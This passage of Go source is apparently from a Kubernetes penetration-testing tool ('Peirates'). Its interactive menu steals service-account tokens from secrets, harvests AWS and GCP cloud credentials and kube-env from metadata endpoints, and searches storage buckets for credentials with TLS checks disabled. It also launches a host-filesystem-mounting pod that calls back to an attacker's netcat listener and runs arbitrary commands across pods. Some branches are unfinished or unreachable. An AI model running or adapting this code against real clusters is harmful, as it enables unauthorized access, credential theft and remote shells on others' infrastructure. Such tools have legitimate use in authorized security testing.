						fmt.Printf("> [%d] %s\n", i, account.Name)
					} else {
						fmt.Printf("  [%d] %s\n", i, account.Name)
					}
				}
			case "2":
				println("\nAvailable Service Accounts:")
				for i, account := range serviceAccounts {
					if account.Name == connectionString.TokenName {
						fmt.Printf("> [%d] %s\n", i, account.Name)
					} else {
						fmt.Printf("  [%d] %s\n", i, account.Name)
					}
				}
				println("\nEnter service account number")
				var tokNum int
				fmt.Scanln(&input)
				_, err := fmt.Sscan(input, &tokNum)
				if err != nil {
					fmt.Printf("Error parsing service account selection: %s\n", err.Error())
				} else if tokNum < 0 || tokNum >= len(serviceAccounts) {
					fmt.Printf("Service account %d does not exist!\n", tokNum)
				} else {
					assignServiceAccountToConnection(serviceAccounts[tokNum], &connectionString)
					fmt.Printf("Selected %s // %s\n", connectionString.TokenName, connectionString.Token)
				}
			case "3":
				serviceAccounts = append(serviceAccounts, readServiceAccountFromCommandLine())
			case "4":
				serviceAccountJSON, err := json.Marshal(serviceAccounts)
				if err != nil {
					fmt.Printf("Error exporting service accounts: %s\n", err.Error())
				} else {
					println(string(serviceAccountJSON))
				}
			case "5":
				var newServiceAccounts []ServiceAccount
				err := json.NewDecoder(os.Stdin).Decode(&newServiceAccounts)
				if err != nil {
					fmt.Printf("Error importing service accounts: %s\n", err.Error())
				} else {
					serviceAccounts = append(serviceAccounts, newServiceAccounts...)
					fmt.Printf("Successfully imported service accounts\n")
				}
			}

			// Menu goes here
		// [2] List namespaces or change namespace
		case "2":
			println("\n[1] List namespaces]\n[2] Switch namespace\n[3] List namespaces then switch namespaces")
			fmt.Scanln(&input)
			switch input {
			case "1":
				Namespaces = PrintNamespaces(connectionString)
				break
			case "2":
				SwitchNamespace(&connectionString)
				break
			case "3":
				Namespaces = PrintNamespaces(connectionString)
				SwitchNamespace(&connectionString)
				break
			default:
				break
			}

		// [3] Get list of pods
		case "3":
			println("\n[+] Printing a list of Pods in this namespace......")
			getListOfPods(connectionString)
			break

		//[4] Get complete info on all pods (json)
		case "4":
			GetPodsInfo(connectionString, &podInfo)
			break

		//	[5] Get list of secrets
		case "5":
			secrets, service_account_tokens := getSecretList(connectionString)
			for _, secret := range secrets {
				println("Secret found: ", secret)
			}
			for _, svc_acct := range service_account_tokens {
				println("Service account found: ", svc_acct)
			}
			break

		// [6] Get a service account token from a secret
		case "6":
			println("\nPlease enter the name of the secret for which you'd like the contents: ")
			var secret_name string
			fmt.Scanln(&secret_name)

			// BUG: Temporarily we're using we're kludgy YAML parsing.
			if !kubectlAuthCanI(connectionString, "get", "secret") {
				println("Permission Denied: your service account isn't allowed to get secrets")
				break
			}
			getSecretYAML, _, err := runKubectlSimple(connectionString, "get", "secret", secret_name, "-o", "yaml")
			if err != nil {
				fmt.Println("[-] Could not retrieve secret")
				break
				// log.Fatal(err)
			}

			lines := strings.Split(string(getSecretYAML), "\n")
			for _, line := range lines {
				matched, err := regexp.MatchString(`^\s*$`, line)
				if err != nil {
					log.Fatal(err)
				}
				if !matched {
					// Looking solely for tokens
					if strings.Fields(line)[0] == "token:" {
						token := strings.Fields(line)[1]
						// println("Encoded: ",token)
						decoded_token, err := base64.StdEncoding.DecodeString(token)
						if err != nil {
							println("ERROR: couldn't decode")
							break
						} else {
							fmt.Printf("Decoded:\n%q\n", decoded_token)
						}
					}
				}
			}

			// To base64 decode, we'd use base64.StdEncoding.DecodeString() - with printf, use %q

			break

			getSecretRaw, _, err := runKubectlSimple(connectionString, "get", "secret", secret_name, "-o", "json")
			// TODO-FAITH - determine which errors mean we should just show an error and break
			if err != nil {
				fmt.Println("[-] Could not retrieve secret")
				break
				// log.Fatal(err)
			} else {
				var secretDetails Secret_Details
				err := json.Unmarshal(getSecretRaw, &secretDetails)
				if err != nil {
					fmt.Println("[-] Error unmarshaling data in this secret: ", err)
					break
				}
				println("Secret has type: ", secretDetails.SecretType)
				if secretDetails.SecretType == "kubernetes.io/service-account-token" {
					//println("Token found: ",secretDetails.Data.Token)
					println("Token found!")
				} else {
					fmt.Println("Non-token secret parsing not yet implemented")

				}

			}

			break
		case "10":
			println("\n[1] Get all host mount points\n[2] Get volume mount points for a specific pod\n\nPeirates:># ")
			fmt.Scanln(&input)

			GetPodsInfo(connectionString, &podInfo)

			switch input {
			case "1":
				println("[+] Getting volume mounts for all pods")
				// BUG: Need to make it so this Get doesn't print all info even though it gathers all info.
				GetHostMountPoints(podInfo)
				//println("[+] Attempting to Mounting RootFS......")
				//MountRootFS(allPods, connectionString)
			case "2":
				println("[+] Please provide the pod name: ")
				fmt.Scanln(&user_response)
				fmt.Printf("[+] Printing volume mount points for %s\n", user_response)
				GetHostMountPointsForPod(podInfo, user_response)
			}

		// [11] Launch a pod mounting its node's host filesystem
		case "11":
			allPods := getPodList(connectionString)
			// TODO: See if we can put the auth check back
			//podCreation := canCreatePods(connectionString)
			//podCreation:= true
			//if ! podCreation {
			//	println(" This token cannot create pods on the cluster")
			//	break
			//}
			//crontab_persist_exec(allPods, connectionString)
			println("What IP and Port will your netcat listener be listening on?")
			var ip, port string
			println("IP:")
			fmt.Scanln(&ip)
			println("Port:")
			fmt.Scanln(&port)
			MountRootFS(allPods, connectionString, ip, port)
			break

		// [13] Request IAM credentials from AWS Metadata API [AWS only] [not yet implemented]
		case "13":
			resp, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
			if err != nil {
				println("Error - could not perform request http://169.254.169.254/latest/meta-data/iam/security-credentials/")
			}
			// Parse result as an account, then construct a request asking for that account's credentials
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			account := string(body)
			println(account)

			request := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + account
			resp_2, err := http.Get(request)
			if err != nil {
				println("Error - could not perform request ", request)
			}
			defer resp_2.Body.Close()
			body_2, err := ioutil.ReadAll(resp_2.Body)
			println(string(body_2))
			break

		// [14] Request IAM credentials from GCP Metadata API [GCP only] [not yet implemented]
		case "14":
			// Create a new HTTP client that uses the correct headers
			client := &http.Client{}
			// Make a request for our service account(s)
			req_accounts, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", nil)
			req_accounts.Header.Add("Metadata-Flavor", "Google")
			resp, err := client.Do(req_accounts)
			if err != nil {
				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
			}
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			// Parse result as one or more accounts, then construct a request asking for each account's credentials
			lines := strings.Split(string(body), "\n")

			for _, line := range lines {
				if strings.TrimSpace(string(line)) == "" {
					continue
				}
				account := strings.TrimRight(string(line), "/")
				fmt.Printf("GCP Credentials for account %s\n", account)

				// TURN THIS INTO A FUNCTION SO WE CAN PARSE the ones we want
				println("Token for ", account, " is ", GetGCPBearerTokenFromMetadataAPI(account))
			}
			break

		// [15] Request kube-env from GCP Metadata API [GCP only]
		case "15":
			// Create a new HTTP client that uses the correct headers
			client := &http.Client{}
			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
			req_kube, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
			req_kube.Header.Add("Metadata-Flavor", "Google")
			resp, err := client.Do(req_kube)
			if err != nil {
				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
			}
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if resp.StatusCode != 200 {
				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
				break
			}
			lines := strings.Split(string(body), "\n")
			for _, line := range lines {
				println(line)
			}

			break

		// [16] Pull Kubernetes service account tokens from S3 [AWS only]
		case "16":
			// Create a new HTTP client that uses the correct headers
			client := &http.Client{}

			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.cluster.bustakube.com
			//
			// Calculate the authorization stuff required:
			// https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-auth-using-authorization-header.html
			// https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-header-based-auth.html
			//
			// List bucket contents:
			// https://docs.aws.amazon.com/AmazonS3/latest/API/v2-RESTBucketGET.html

			// Get the object contents:
			// https://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectGET.html

			// GET /?list-type=2 HTTP/1.1
			// Host: BucketName.s3.amazonaws.com
			// Date: date
			// Authorization: authorization string (see Authenticating Requests (AWS Signature Version 4))

			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
			req_kube, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
			req_kube.Header.Add("Metadata-Flavor", "Google")
			resp, err := client.Do(req_kube)
			if err != nil {
				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
			}
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if resp.StatusCode != 200 {
				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
				break
			}
			lines := strings.Split(string(body), "\n")
			for _, line := range lines {
				println(line)
			}

			break

		// [17] Pull Kubernetes service account tokens from GCS [GCP only] [not yet implemented]
		case "17":
			token := GetGCPBearerTokenFromMetadataAPI("default")
			if token == "ERROR" {
				println("ERROR: Could not get GCP default token from metadata API")
				break
			} else {
				println("Got default token for GCP - preparing to use it for GCS: ", token)
			}
			// Need to get project ID from metadata API
			client := &http.Client{}
			req_projid, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", nil)
			req_projid.Header.Add("Metadata-Flavor", "Google")
			resp_projid, err := client.Do(req_projid)
			if err != nil {
				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id")
				resp_projid.Body.Close()
				break
			}
			defer resp_projid.Body.Close()
			body, err := ioutil.ReadAll(resp_projid.Body)
			// Parse result as one or more accounts, then construct a request asking for each account's credentials
			project_id := string(body)
			println("Got numberic project ID", project_id)

			// Prepare to do non-cert-checking https requests
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			}
			ssl_client := &http.Client{Transport: tr}

			// Get a list of buckets
			// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
			url_list_buckets := "https://www.googleapis.com/storage/v1/b/?project=" + project_id
			req_list_buckets, err := http.NewRequest("GET", url_list_buckets, nil)
			req_list_buckets.Header.Add("Metadata-Flavor", "Google")
			bearer_token := "Bearer " + token
			req_list_buckets.Header.Add("Authorization", bearer_token)
			req_list_buckets.Header.Add("Accept", "json")
			resp_list_buckets, err := ssl_client.Do(req_list_buckets)
			if err != nil {
				log.Fatal(err)
				fmt.Printf("Error - could not perform request --%s--\n", url_list_buckets)
				resp_list_buckets.Body.Close()
				break
			}
			defer resp_list_buckets.Body.Close()
			body_list_buckets, err := ioutil.ReadAll(resp_list_buckets.Body)
			bucket_list_lines := strings.Split(string(body_list_buckets), "\n")

			// Build our list of bucket URLs
			var bucket_urls []string
			for _, line := range bucket_list_lines {
				if strings.Contains(line, "selfLink") {
					url := strings.Split(line, "\"")[3]
					bucket_urls = append(bucket_urls, url)
				}
			}
			// In every bucket URL, look at the objects
			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
			for _, line := range bucket_urls {
				println("Checking bucket for credentials: ", line)
				url_list_objects := line + "/o"
				println("Trying URL", url_list_objects)
				req_list_objects, err := http.NewRequest("GET", url_list_objects, nil)
				req_list_objects.Header.Add("Metadata-Flavor", "Google")
				bearer_token := "Bearer " + token
				req_list_objects.Header.Add("Authorization", bearer_token)
				req_list_objects.Header.Add("Accept", "json")
				resp_list_objects, err := ssl_client.Do(req_list_objects)
				if err != nil {
					log.Fatal(err)
					fmt.Printf("Error - could not perform request --%s--\n", url_list_objects)
					resp_list_objects.Body.Close()
					break
				}
				defer resp_list_objects.Body.Close()
				body_list_objects, err := ioutil.ReadAll(resp_list_buckets.Body)
				object_list_lines := strings.Split(string(body_list_objects), "\n")

				// print each bucket list line - later we'll inspect for useful stuff.
				for _, line := range object_list_lines {
					println("-", line)
				}
			}

			// Run through the object list, finding those with /secret in them.  While URL-encoding each object, appending ?alt=media to get the contents.

			// Each of these objects is a service account token - display

			//
			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()

			break
		case "19":
			break
		// [30] Run command in one or all pods in this namespace
		case "30":
			banner(connectionString)
			println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
			fmt.Scanln(&input)
			println("[+] Please Provide the command to run in the pods: ")
			fmt.Scanln(&cmdOpts.commandToRunInPods)
			switch input {
			case "1":
				println("[+] Please Provide the specified pod to run the command: ")
				fmt.Scanln(&cmdOpts.podsToRunTheCommandIn)
				var pod_to_run_in string
				fmt.Scanln(&pod_to_run_in)
				cmdOpts.podsToRunTheCommandIn = []string{pod_to_run_in}

				if cmdOpts.commandToRunInPods != "" {
					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
						execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
					}
				}
			case "2":
				var input string
				if cmdOpts.commandToRunInPods != "" {
					execInAllPods(connectionString, cmdOpts.commandToRunInPods)
				} else {
					fmt.Print("ERROR - command string was empty.")
					fmt.Scanln(&input)
				}

			}
		case "98":
			break
		case "99":
			break

		}
		clear_screen()
	}
	//---------------------------------------------------------
	//	parseOptions(&cmdOpts)

	//	if inAPod(connectionString) {
	//		println("+ You are in a pod.")
	//	} else {
	//		println("- You are not in a Kubernetes pod.")
	//	}

	//	allPods := getPodList(connectionString)

	//GetRoles(connectionString, &kubeRoles)
	//GetPodsInfo(connectionString, &podInfo)
	//GetHostMountPoints(podInfo)
	//GetHostMountPointsForPod(podInfo, "attack-daemonset-6fmjc")
	//for _, pod := range allPods {
	// JAY / TODO: Put me back
	//	println("Running a hostname command in pod: " + pod)
	//	print(getHostname(connectionString, pod))
	//}
	//if cmdOpts.commandToRunInPods != "" {
	//	if len(cmdOpts.podsToRunTheCommandIn) > 0 {
	//		execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
	//	} else {
	//		execInAllPods(connectionString, cmdOpts.commandToRunInPods)
	//	}
	//}
	//podCreation := canCreatePods(connectionString)
	//if podCreation {
	//	println("+ This token can create pods on the cluster")
	//} else {
	//	println(" This token cannot create pods on the cluster")
	//}
	//MountRootFS(allPods, connectionString)

}
